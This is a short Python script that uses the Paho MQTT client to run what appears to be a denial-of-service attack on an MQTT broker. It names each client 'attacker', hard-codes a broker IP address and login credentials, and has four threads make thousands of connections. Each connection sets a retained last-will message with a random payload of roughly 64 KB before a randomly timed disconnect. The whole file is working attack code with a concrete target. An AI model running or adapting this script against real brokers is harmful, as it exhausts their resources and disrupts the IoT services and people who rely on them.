import paho.mqtt.client as mqtt #import the Paho MQTT client package
import threading
import time
import string
import random

pay_load_len = random.randint(64000,65535)
pay_load = ''.join(random.choices(string.ascii_letters+string.digits,k = pay_load_len))

def on_connect(client, userdata, flags, rc):
    print("Connected flags: ",str(flags),"result code ",str(rc))
    
def makeConnection():
    for _ in range(1000):
        broker_address="34.125.53.182"
        client = mqtt.Client("attacker",clean_session=True) #create new instance
        _username = 'mqttbroker'
        _password = 'test123'
        client.username_pw_set(username=_username,password=_password)
        client.will_set('iQ3OOSQ/Y/dLq8Dou3G', payload=pay_load, qos=0, retain=True)
        client.on_connect = on_connect
        client.loop_start()  #start the call back loop
        client.connect(broker_address) #connect to broker
        gap = random.randint(0,60)
        time.sleep(gap) #wait
        client.loop_stop()  #stop the call back loop
        client.disconnect()


thread1 = threading.Thread(target=makeConnection)
thread2 = threading.Thread(target=makeConnection)
thread3 = threading.Thread(target=makeConnection)
thread4 = threading.Thread(target=makeConnection)


thread1.start()
thread2.start()
thread3.start()
thread4.start()

thread1.join()
thread2.join()
thread3.join()
thread4.join()